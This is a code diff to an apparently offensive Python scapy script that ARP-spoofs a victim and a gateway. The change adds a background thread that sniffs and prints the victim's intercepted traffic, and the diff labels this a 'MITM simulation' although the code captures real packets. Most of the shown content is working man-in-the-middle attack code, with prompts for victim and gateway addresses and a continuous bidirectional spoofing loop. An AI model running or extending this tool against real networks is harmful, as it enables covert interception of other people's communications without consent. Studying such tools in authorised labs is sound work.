@@ -2,6 +2,7 @@
 import scapy.all as scapy
 import time
 import sys
+import threading
 
 def get_mac(ip):
     """
@@ -35,23 +36,43 @@ def restore(dest_ip, src_ip):
                          psrc=src_ip, hwsrc=src_mac)
     scapy.send(packet, count=5, verbose=False)
 
+def sniff_packets(target_ip):
+    """
+    Sniffs packets involving the target IP and prints a summary of each packet.
+    This simulates the MITM attack by allowing you to see the intercepted traffic.
+    """
+    print("\n[*] Starting packet sniffing. Press CTRL+C to stop sniffing.\n")
+    # Capture only IP packets involving the target
+    filter_str = f"ip host {target_ip}"
+    try:
+        scapy.sniff(filter=filter_str, prn=lambda pkt: pkt.summary(), store=False)
+    except KeyboardInterrupt:
+        print("\n[*] Packet sniffing stopped.\n")
+        return
+
 def main():
-    print("=== ARP Spoofing Tool ===")
+    print("=== ARP Spoofing & MITM Simulation Tool ===")
     target_ip = input("Enter target IP (victim): ").strip()
     gateway_ip = input("Enter gateway IP: ").strip()
+    
+    simulate_mitm = input("Do you want to enable MITM simulation (packet sniffing)? (y/n): ").strip().lower()
+    
+    # If MITM simulation is enabled, start sniffing in a separate thread
+    if simulate_mitm == 'y':
+        sniff_thread = threading.Thread(target=sniff_packets, args=(target_ip,), daemon=True)
+        sniff_thread.start()
     
     print("\n[*] Starting ARP spoofing. Press CTRL+C to stop and restore ARP tables.\n")
     
     packets_sent = 0
     try:
         while True:
-            # Tell the target that the gateway is at our MAC
+           
             spoof(target_ip, gateway_ip)
-            # Tell the gateway that the target is at our MAC (for a MITM attack)
+            
             spoof(gateway_ip, target_ip)
             
             packets_sent += 2
-            # Print a status message showing progress on the same line
             sys.stdout.write(f"\r[+] Packets sent: {packets_sent}")
             sys.stdout.flush()
             
